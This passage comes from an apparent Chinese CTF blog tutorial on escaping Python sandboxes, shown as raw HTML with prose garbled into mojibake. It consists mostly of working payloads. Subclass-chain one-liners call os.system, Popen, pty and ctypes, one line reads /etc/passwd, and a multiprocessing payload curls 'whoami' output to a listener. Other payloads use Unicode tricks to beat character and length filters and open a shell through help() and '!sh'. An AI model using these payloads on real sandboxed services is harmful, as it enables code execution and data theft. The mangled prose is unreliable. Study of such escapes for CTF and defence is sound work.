class="built_in">__import__</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure></div><p>è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨ python ç»§æ‰¿é“¾æ¥ç»•è¿‡ï¼Œå…¶æ­¥éª¤ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ python ç»§æ‰¿é“¾è·å–å†…ç½®ç±»ï¼Œç„¶åé€šè¿‡è¿™äº›å†…ç½®ç±»è·å–åˆ°æ•æ„Ÿæ–¹æ³•ä¾‹å¦‚ os.system ç„¶åå†è¿›è¡Œåˆ©ç”¨ã€‚</p><p><a class="link" href="https://xz.aliyun.com/t/2308?time__1311=n4%2BxnieDqWqYq7KYBKDsf3ObzDkQKQ11DBQoD">ç”¨ python ç»§æ‰¿é“¾æäº‹æƒ… <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>å…·ä½“åŸç†å¯è§ï¼š<a class="link" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals">Python æ²™ç®±é€ƒé€¸å°ç»“ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>å¸¸è§çš„ä¸€äº› payload å¦‚ä¸‹:</p><h5 id="rce-2"><a class="markdownIt-Anchor" href="#rce-2">#</a> RCE</h5><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure></div><h5 id="file"><a class="markdownIt-Anchor" href="#file">#</a> File</h5><p>æ“ä½œæ–‡ä»¶å¯ä»¥ä½¿ç”¨ builtins ä¸­çš„ openï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ FileLoader æ¨¡å—çš„ get_data æ–¹æ³•ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="ç»•è¿‡é•¿åº¦é™åˆ¶"><a class="markdownIt-Anchor" href="#ç»•è¿‡é•¿åº¦é™åˆ¶">#</a> ç»•è¿‡é•¿åº¦é™åˆ¶</h3><p>BYUCTF_2023 ä¸­çš„å‡ é“ jail é¢˜å¯¹ payload çš„é•¿åº¦ä½œäº†é™åˆ¶</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div><p>é¢˜ç›®é™åˆ¶ä¸èƒ½å‡ºç°æ•°å­—å­—æ¯ï¼Œæ„é€ çš„ç›®æ ‡æ˜¯è°ƒç”¨ open å‡½æ•°è¿›è¡Œè¯»å–</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br></pre></td></tr></table></figure></div><p>å‡½æ•°åæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œç›´æ¥ä½¿ç”¨ unicodeã€‚æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ ord æ¥è·å–ç„¶åè¿›è¡Œç›¸å‡ã€‚æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ chr (333).</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã§&#x27;)</span></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¡&#x27;)</span></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¬&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¦&#x27;)</span></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;Å&#x27;)-ord(&#x27;ÄŸ&#x27;)</span></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã™&#x27;)</span></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã•&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã§&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¡&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¬&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¦&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ÄŸ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã™&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã•&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã™&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure></div><p>ä½†è¿™æ ·çš„è¯å…¶å®é•¿åº¦è¶…å‡ºäº†é™åˆ¶ã€‚è€Œé¢˜ç›®çš„ eval è¡¨ç¤ºä¸æ”¯æŒåˆ†å·ï¼›ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ª execã€‚ç„¶åå°† ord ä»¥åŠä¸å˜çš„  <code>a('Å')</code>  è¿›è¡Œæ›¿æ¢ã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ payload</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;Å&#x27;);print(open(bytes([b-a(&#x27;Ã§&#x27;),b-a(&#x27;Ã¡&#x27;),b-a(&#x27;Ã¬&#x27;),b-a(&#x27;Ã¦&#x27;),b-a(&#x27;ÄŸ&#x27;),b-a(&#x27;Ã™&#x27;),b-a(&#x27;Ã•&#x27;),b-a(&#x27;Ã™&#x27;)])).read())&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>ä½†å…¶å®å°è¯•ä¹‹åå‘ç°è¿™ä¸ª payload ä¼šæŠ¥é”™ï¼ŒåŸå› åœ¨äºå…¶ä¸­çš„æŸäº› unicode å­—ç¬¦é‡åˆ° lower () æ—¶ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé¿å… lower äº§ç”Ÿå¹²æ‰°ï¼Œå¯ä»¥åœ¨é€‰å– unicode æ—¶é€‰æ‹© ord å€¼æ›´å¤§çš„å­—ç¬¦ã€‚ä¾‹å¦‚ chr (4434)</p><p>å½“ç„¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ input å‡½æ•°æ¥ç»•è¿‡é•¿åº¦é™åˆ¶ã€‚</p><h4 id="æ‰“å¼€-input-è¾“å…¥"><a class="markdownIt-Anchor" href="#æ‰“å¼€-input-è¾“å…¥">#</a> æ‰“å¼€ input è¾“å…¥</h4><p>å¦‚æœæ²™ç®±å†…æ‰§è¡Œçš„å†…å®¹æ˜¯é€šè¿‡ input è¿›è¡Œä¼ å…¥çš„è¯ï¼ˆä¸æ˜¯ web ä¼ å‚ï¼‰ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ä¼ å…¥ä¸€ä¸ª input æ‰“å¼€ä¸€ä¸ªæ–°çš„è¾“å…¥æµï¼Œç„¶åå†è¾“å…¥æœ€ç»ˆçš„ payloadï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ‰€æœ‰çš„é˜²æŠ¤ã€‚</p><p>ä»¥ BYUCTF2023 jail a-z0-9 ä¸ºä¾‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div><p>å³ä½¿é™åˆ¶äº†å­—æ¯æ•°å­—ä»¥åŠé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ä¸‹é¢çš„ payloadï¼ˆæ³¨æ„æ˜¯ unicodeï¼‰<br>()<br> è¿™æ®µ payload æ‰“å¼€ input è¾“å…¥åï¼Œæˆ‘ä»¬å†è¾“å…¥æœ€ç»ˆçš„ payload å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>æ‰“å¼€è¾“å…¥æµéœ€è¦ä¾èµ– input å‡½æ•°ï¼Œno builtins çš„ç¯å¢ƒä¸­æˆ–è€…é¢˜ç›®éœ€è¦ä»¥ http è¯·æ±‚çš„æ–¹å¼è¿›è¡Œè¾“å…¥æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›æ‰“å¼€è¾“å…¥æµçš„æ–¹å¼:</p><h5 id="sysstdinread"><a class="markdownIt-Anchor" href="#sysstdinread">#</a> sys.stdin.read()</h5><p>æ³¨æ„è¾“å…¥å®Œæ¯•ä¹‹åæŒ‰ ctrl+d ç»“æŸè¾“å…¥</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">kali</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div><h5 id="sysstdinreadline"><a class="markdownIt-Anchor" href="#sysstdinreadline">#</a> sys.stdin.readline()</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="sysstdinreadlines"><a class="markdownIt-Anchor" href="#sysstdinreadlines">#</a> sys.stdin.readlines()</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>åœ¨ python2 ä¸­ï¼Œåœ¨ python 2 ä¸­ï¼Œinput å‡½æ•°ä»æ ‡å‡†è¾“å…¥æ¥æ”¶è¾“å…¥ä¹‹åä¼šè‡ªåŠ¨ eval æ±‚å€¼ã€‚å› æ­¤æ— éœ€åœ¨å‰é¢åŠ ä¸Š evalã€‚ä½† raw_input ä¸ä¼šè‡ªåŠ¨ evalã€‚</p><h4 id="breakpoint-å‡½æ•°"><a class="markdownIt-Anchor" href="#breakpoint-å‡½æ•°">#</a> breakpoint å‡½æ•°</h4><p>pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚</p><p>åœ¨è¾“å…¥ breakpoint () åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç </p><h3 id="help-å‡½æ•°"><a class="markdownIt-Anchor" href="#help-å‡½æ•°">#</a> help å‡½æ•°</h3><p>help å‡½æ•°å¯ä»¥æ‰“å¼€å¸®åŠ©æ–‡æ¡£ã€‚ç´¢å¼•åˆ° os æ¨¡å—ä¹‹åå¯ä»¥æ‰“å¼€ sh</p><p>å½“æˆ‘ä»¬è¾“å…¥ help æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©</p><p>ç„¶åè¾“å…¥ os, æ­¤æ—¶ä¼šè¿›å…¥ os çš„å¸®åŠ©æ–‡æ¡£ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br></pre></td></tr></table></figure></div><p>ç„¶ååœ¨è¾“å…¥  <code>!sh</code>  å°±å¯ä»¥æ‹¿åˆ° /bin/sh, è¾“å…¥  <code>!bash</code>  åˆ™å¯ä»¥æ‹¿åˆ° /bin/bash</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h3 id="ç»•è¿‡å¤šè¡Œé™åˆ¶"><a class="markdownIt-Anchor" href="#ç»•è¿‡å¤šè¡Œé™åˆ¶">#</a> ç»•è¿‡å¤šè¡Œé™åˆ¶</h3><p>ç»•è¿‡å¤šè¡Œé™åˆ¶çš„åˆ©ç”¨æ‰‹æ³•é€šå¸¸åœ¨é™åˆ¶äº†å•è¡Œä»£ç çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œä¾‹å¦‚ eval, ä¸­é—´å¦‚æœå­˜åœ¨ï¼›æˆ–è€…æ¢è¡Œä¼šæŠ¥é”™ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h4 id="exec"><a class="markdownIt-Anchor" href="#exec">#</a> exec</h4><p>exec å¯ä»¥æ”¯æŒæ¢è¡Œç¬¦ä¸ <code>;</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div><h4 id="compile"><a class="markdownIt-Anchor" href="#compile">#</a> compile</h4><p>compile åœ¨ single 